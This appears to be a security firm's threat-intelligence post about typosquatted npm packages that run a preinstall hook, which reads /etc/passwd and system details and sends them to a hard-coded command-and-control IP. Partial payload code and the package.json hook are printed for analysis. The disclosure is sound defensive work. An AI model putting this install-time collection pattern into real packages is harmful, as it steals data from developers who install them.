Today our OSS package malware analysis bot picked up a new campaign targeting
developers using npm. The campaign involves publishing multiple npm packages
that impersonate popular package names. These packages are being used to
collect basic system information and the contents of `/etc/passwd` file from
the infected systems.

Our system picked up the following packages with very similar behaviour
matching common information gathering techniques:

| Package Name    | Version |
|-----------------|---------|
| themes-vendor   | 0.0.1 |
| x509-escaping   | 0.0.1 |
| keycloak-server | 0.0.1 |
| module-stub     | 0.0.1 |
| keycloak-server | 0.0.3 |
| postject-copy   | 0.0.0 |
| micrometer-docs | 0.0.3 |
| orbit-playroom  | 0.0.0 |
| x509-escaping   | 0.0.0 |
| weekendfe       | 0.0.1 |
| themes-vendor   | 0.0.0 |

`npm` promptly removed these packages from the registry. This was possible
because no other package depended on these malicious packages. All packages
had a similar payload that was being executed when the package was installed.
For example, `themes-vendor` shipped a `package.json` file with the following

```json
{
  "name": "themes-vendor",
  "version": "0.0.1",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "preinstall": "node index.js"
  },
  "author": "",
  "license": "ISC"
}
```

The `preinstall` script in the `package.json` file executed the `index.js`
script which in turn executed the following code:

```javascript
// [...]
const apiHostname = '13.60.183.44';
const apiPort = 5000;
const apiPath = '/submit';

// [...]
let whoamiInfo = '';
try {
    // Execute the 'whoami' command and trim the output
    whoamiInfo = execSync('cat /etc/passwd', { encoding: 'utf-8' }).trim();
} catch (error) {
    whoamiInfo = `Error executing whoami: ${error.message}`;
}

// [...]
const deviceInfo = {
    platform: os.platform(),
    release: os.release(),
    hostname: os.hostname(),
    arch: os.arch(),
    userInfo: os.userInfo(),
    networkInterfaces: os.networkInterfaces(),
    whoamiinfo: whoamiInfo,
    user: "themes-vendor",
};
```

The command and control IP `13.60.183.44` belongs to AWS which along with the
nature of the payload suggests that this campaign is a possible red-team or
security research activity.

```shell
NetRange:       13.60.0.0 - 13.63.255.255
CIDR:           13.60.0.0/14
NetName:        AMAZO-4
NetHandle:      NET-13-60-0-0-1
Parent:         NET13 (NET-13-0-0-0-0)
NetType:        Direct Allocation
OriginAS:
Organization:   Amazon.com, Inc. (AMAZO-4)
RegDate:        2022-10-11

```

## Conclusion

This campaign appears to be a playground for the attackers or possible
red-teamers to test their malware distribution techniques. While the payload
does not appear to be sophisticated or damaging, it still highlights the very
real threat of malicious packages impersonating popular package names.
